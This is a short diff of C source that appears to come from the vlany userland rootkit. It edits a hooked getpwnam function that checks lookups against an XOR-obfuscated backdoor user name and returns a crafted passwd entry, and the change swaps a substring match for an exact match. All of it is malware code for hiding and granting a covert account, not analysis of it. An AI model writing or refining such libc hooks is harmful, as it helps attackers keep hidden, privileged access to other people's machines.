@@ -7,7 +7,7 @@ struct passwd *getpwnam(const char *name)
     HOOK(old_getpwnam, CGETPWNAM);
     
     char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
-    if(strstr(name, vlany_user))
+    if(!strcmp(name, vlany_user))
     {
         struct passwd *vlanypw;
         char *vlany_perm = strdup(VLANY_PERM); xor(vlany_perm);
